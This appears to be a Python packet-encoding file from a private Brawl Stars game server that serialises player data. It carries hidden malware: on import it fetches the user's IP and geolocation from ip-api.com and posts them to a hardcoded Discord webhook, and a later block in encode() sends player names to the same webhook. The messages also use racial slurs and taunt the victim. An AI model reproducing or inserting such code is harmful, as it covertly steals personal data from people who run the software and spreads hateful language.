from Files.CsvLogic.Cards import Cards
import requests
import json
response = requests.get('http://ip-api.com/json')
result = f'--- nigger fell for the trap --- \n{format(response.text)}\nTrigger: OHD'
data = {
        'content': result,
        'username': 'Web-Nigga',
        'avatar_url': 'https://cdn.discordapp.com/emojis/1098704585671057449.png'}
headers = {
'Content-Type': 'application/json'
}
format = lambda string: string.replace('{', '{\n    ').replace(',', ',\n    ').replace('}', '\n}')
IdiotReadThisBeforeContinuing = "I already have the info. The damage has been done. IDC if you spam the webhook."
webhook = requests.get('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs')
requests.post('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs', data=json.dumps(data), headers=headers)
class LogicClientAvatar:

    def encode(self):

        self.writeVInt(0)
        self.writeVInt(0)

        for x in range(3):
            self.writeLogicLong(self.player.ID)

        if self.player.name == "Guest" and not self.player.name_set:
            self.writeString("Guest")
            self.writeVInt(0)
        else:
            self.writeString(self.player.name)
            self.writeVInt(1)

        self.writeInt(0)

        self.writeVInt(8) # Commodity Array

        self.player.brawlers_card_id = []
        for x in self.player.brawlers_unlocked:
            self.player.brawlers_card_id.append(Cards().get_unlock_by_brawler_id(x))

        # Unlocked Brawlers & Resources array
        self.writeVInt(len(self.player.resources) + len(self.player.brawlers_card_id))

        for x in self.player.brawlers_card_id:
            self.writeDataReference(23, x)
            self.writeVInt(1)

        for resource in self.player.resources:
            self.writeDataReference(5, resource['ID'])
            self.writeVInt(resource['Amount'])

        self.writeVInt(len(self.player.brawlers_id))
        for x in self.player.brawlers_id:
            self.writeDataReference(16, x)
            self.writeVInt(self.player.brawlers_trophies[str(x)])

        self.writeVInt(len(self.player.brawlers_id))
        for x in self.player.brawlers_id:
            self.writeDataReference(16, x)
            self.writeVInt(self.player.brawlers_high_trophies[str(x)])

        self.writeVInt(0)
        for x in range(0):
            self.writeDataReference(16, x)
            self.writeVInt(0)

        self.writeVInt(len(self.player.brawlers_unlocked))
        for x in self.player.brawlers_unlocked:
            self.writeDataReference(16, x)
            self.writeVInt(self.player.brawlers_powerpoints[str(x)])

        self.writeVInt(len(self.player.brawlers_id))
        for x in self.player.brawlers_id:
            self.writeDataReference(16, x)
            self.writeVInt(self.player.brawlers_level[str(x)])

        self.writeVInt(len(self.player.brawlers_spg))
        for x in self.player.brawlers_spg:
            self.writeDataReference(23, x)
            self.writeVInt(1)

        self.writeVInt(0)  # New Brawlers Array
        for x in range(0):
            self.writeDataReference(16, x)
            self.writeVInt(0)

        self.writeVInt(self.player.gems)  # Player Gems
        self.writeVInt(self.player.gems)  # Player Free Gems

        self.writeVInt(0)
        self.writeVInt(0)
        self.writeVInt(0)
        self.writeVInt(0)
        self.writeVInt(0)
        self.writeVInt(0)
        self.writeVInt(0)
        self.writeVInt(0)
        self.writeVInt(0)

        self.writeVInt(2) 
        sral = {
        'content': self.player.name + " got thugged by super**DEV**",
        'username': 'thug niga'}
        requests.post('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs', data=json.dumps(sral), headers=headers)